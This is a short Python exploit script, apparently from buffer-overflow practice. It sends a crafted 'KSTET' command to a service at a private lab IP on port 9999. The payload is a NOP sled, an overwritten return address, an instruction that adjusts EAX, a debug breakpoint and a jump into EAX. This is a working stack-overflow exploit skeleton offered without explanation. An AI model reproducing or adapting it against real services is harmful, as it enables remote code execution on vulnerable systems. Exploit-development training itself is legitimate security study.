import socket, sys
payload=b""
payload+=b"\x90"*70
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xcc"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"KSTET "+payload))
s.close()
sys.exit()
